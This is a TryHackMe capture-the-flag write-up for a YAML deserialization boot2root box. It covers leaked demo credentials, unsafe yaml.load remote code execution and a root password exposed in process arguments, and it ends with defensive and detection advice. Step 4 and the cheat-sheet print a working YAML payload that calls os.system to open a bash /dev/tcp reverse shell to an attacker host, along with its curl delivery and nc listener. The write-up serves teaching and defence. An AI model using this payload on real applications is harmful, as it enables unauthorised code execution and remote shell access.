## CTF Writeup — "Beach Bar" YAML Deserialization Boot2Root (TryHackMe)
### TryHackMe · Hacker Holidays · Web / Boot2Root · Easy (60 pts) · leaked creds → YAML RCE → credential-reuse root

**User flag:** `THM{REDACTED}`
**Root flag:** `THM{REDACTED}`

---

## TL;DR

Leaked `dj/dj` credentials in an HTML comment get you into a staff area with an
"import playlist" feature that parses YAML with the **unsafe loader** — remote code
execution. That gives a shell as a low-privilege user; the user flag is right there.
For root, a service running as root exposes its password on its command line (via
`ps`), and that password is reused as root's login. Two flags.

---

## The attack chain

```
Login page HTML  →  comment leaks dj/dj credentials
        │
        ▼
Log in  →  /import feature parses YAML with unsafe yaml.load
        │
        ▼
Malicious playlist (!!python/object/apply:os.system)  →  RCE  →  reverse shell
        │
        ▼
Shell as 'bartender'  →  USER FLAG
        │
        ▼
ps aux  →  a root service has its password in its command-line args
        │
        ▼
That password is reused as root's  →  su root  →  ROOT FLAG
```

Maps to the briefing: "the jukebox accepts a little more than song titles" (YAML
RCE), "the DJ who never logs out" (leaked demo cred), "a service down the boardwalk
announcing something" (the root service leaking its password).

---

## Background: unsafe deserialization

A **boot2root** means: get any foothold on the machine, then escalate to `root`.

The foothold here is **unsafe deserialization**. Many apps let you import data in a
structured format (YAML, JSON, pickle). Python's YAML library has two modes:

- `yaml.safe_load()` — only builds basic types (strings, lists, dicts). Safe.
- `yaml.load(..., Loader=yaml.Loader)` — the **full** loader. It honours special
  tags like `!!python/object/apply:` that tell YAML to *call a Python function*
  while parsing. If an attacker controls the YAML, they choose the function and its
  arguments — arbitrary code execution.

So a feature meant to import a playlist becomes a way to run commands, if it uses
the unsafe loader on your input.

## Scope note

THM-provisioned target, worked from the THM attackbox inside their network.

## Step 1 — Recon

```bash
nmap -sC -sV -p22,80 $IP
```

- **22** SSH (secondary). **80** HTTP, `Server: gunicorn` → a **Flask** (Python) app.
  That Python stack is why the foothold turns out to be a Python-specific bug.

## Step 2 — The login page leaks its own credentials

```bash
curl -s http://$IP/login
```

Buried in the HTML:

```html
<!-- staff note: the demo DJ login is still enabled for the soft opening.
     dj / dj  -- swap this before the season starts -->
```

**`dj / dj`** — debug credentials shipped to production in a source comment. Log in
and keep the session cookie:

```bash
curl -s -i -c cookies.txt -X POST http://$IP/login -d 'username=dj&password=dj'
```

- `-c cookies.txt` saves the session cookie; a `302` to `/dashboard` means success.

## Step 3 — Authenticated enumeration

With the session cookie, directory-brute again to find staff routes:

```bash
gobuster dir -u http://$IP/ -w /usr/share/wordlists/dirb/common.txt \
  -H "Cookie: session=<value>" -b 404 -t 40
```

Reveals `/export` (downloads a playlist as **YAML**) and `/import` (pastes/uploads
YAML). The export/import pair is the tell: export shows the format, import consumes
it — if import parses YAML unsafely, that's RCE.

## Step 4 — Foothold: unsafe YAML deserialization → RCE

The import form field is `playlist`; the form is `multipart/form-data`. A malicious
"playlist" that calls `os.system` instead of listing tracks:

```yaml
!!python/object/apply:os.system
- "bash -c 'bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1'"
```

- `!!python/object/apply:os.system` tells the unsafe loader to **call
  `os.system(...)`**; the list underneath is the argument.
- The argument is a **reverse shell**: `bash -i` starts an interactive shell,
  `>& /dev/tcp/<ip>/4444` redirects it over a network connection back to us,
  `0>&1` wires up input so we can type.

Fire it (listener first):

```bash
nc -lvnp 4444                                  # catch the shell (attacker box)
curl -s -b cookies.txt -X POST http://$IP/import -F "playlist=$(cat payload.yaml)"
```

- `nc -lvnp 4444` listens on port 4444 for the incoming shell.
- `-F "playlist=..."` submits the YAML as the multipart `playlist` field.

> **Gotcha:** the first attempt used `--data-urlencode "data@payload.yaml"` and
> silently failed — wrong field name (`data`, not `playlist`) and wrong encoding
> (the form is multipart). `-F "playlist=..."` is the correct delivery.

Result — a shell as **`bartender`**. Stabilise it:

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
```

## Step 5 — User flag

```bash
cat /home/bartender/user.txt
# THM{REDACTED}
```

## Step 6 — Privilege escalation enumeration (the dead ends)

Worth showing what was ruled out — privesc was elimination:

```bash
sudo -l                                 # asks for a password bartender doesn't have → dead end
find / -perm -4000 -type f 2>/dev/null  # only stock SUID binaries → nothing exploitable
cat /etc/crontab                        # stock only, no custom root jobs → dead end
cat app.py                              # only cred is dj/dj → no second secret here
```

The root path had to be elsewhere on the system.

## Step 7 — Root: a password leaked on a command line

List processes and look at what runs as **root**:

```bash
ps aux | grep root
```

One line gives it away:

```
root  610  /opt/beach-bar/venv/bin/python jukeboxd.py --stream-pass <PASSWORD> --bitrate 320k
```

`jukeboxd` — the "service down the boardwalk announcing something" — runs **as
root** with a password passed as a **command-line argument.** Command-line
arguments are world-readable (any user can see them via `ps` or
`/proc/<pid>/cmdline`), and that stream password is **reused as root's login
password**:

```bash
su root        # enter the password recovered from the ps output
```

> `su` needs a proper TTY — if it rejects a correct password with "Authentication
> failure," upgrade the shell with the `pty.spawn` line first.

## Step 8 — Root flag

```bash
id                  # uid=0(root)
cat /root/root.txt
# THM{REDACTED}
```

**Rooted.**

---

## Root cause summary

- **Auth** — demo credentials (`dj/dj`) hardcoded and leaked in an HTML comment.
- **RCE** — `yaml.load(..., Loader=yaml.Loader)` on user input executes
  `!!python/object` tags.
- **Privesc** — a root service passed a secret on its command line (world-readable
  via `ps`), and that secret was reused as root's password.

## Defensive takeaways

- **Never ship debug logins;** scan source and rendered HTML for comments before
  release (CI check).
- **Use `yaml.safe_load()`** — always, for anything user-supplied. Same lesson for
  `pickle`, `eval`, `exec`.
- **Never pass secrets as CLI arguments** — use environment variables, a
  tight-permission config file, or a secrets manager. `ps`/`/proc` expose args to
  every local user.
- **Never reuse credentials** — a service password should never equal root's.
- **Run services as dedicated low-privilege users** — `jukeboxd` didn't need root.

## Detection opportunities

- **Process-argument monitoring** (auditd `execve`, EDR): alert on secrets-shaped
  CLI args (`--pass`, `--token`, `--key` followed by a value) — catches both the
  vulnerable launch and an attacker reading it.
- **Deserialization RCE**: a Python web process spawning `bash`/`sh` is a
  high-signal parent-child anomaly; `gunicorn → bash -i` should never happen.
- **Reverse-shell egress**: outbound TCP from the web-server user to an odd port
  (4444) — network-side detection independent of the app.

## Command cheat-sheet

```
nmap -sC -sV -p<ports> $IP
gobuster dir -u ... -H "Cookie: session=..." -b 404       # authenticated brute
# YAML RCE payload:  !!python/object/apply:os.system  + reverse-shell command
curl -b cookies.txt -F "playlist=$(cat payload.yaml)" http://$IP/import
nc -lvnp 4444
python3 -c 'import pty;pty.spawn("/bin/bash")'            # stabilise shell
sudo -l ; find / -perm -4000 -type f 2>/dev/null ; cat /etc/crontab   # privesc triad
ps aux | grep root                                        # secrets in process args
```

## Two things worth remembering

1. **`yaml.load` on user input is RCE.** An "import" feature that accepts YAML/
   pickle/JSON is a deserialization sink until proven safe — try
   `!!python/object/apply` early.
2. **`ps` leaks secrets.** Any password on a command line is readable by every
   local user, and app/service passwords are routinely reused as the login password.

*Target, users, and credentials are fictional challenge material; all actions
against the THM-provisioned machine.*
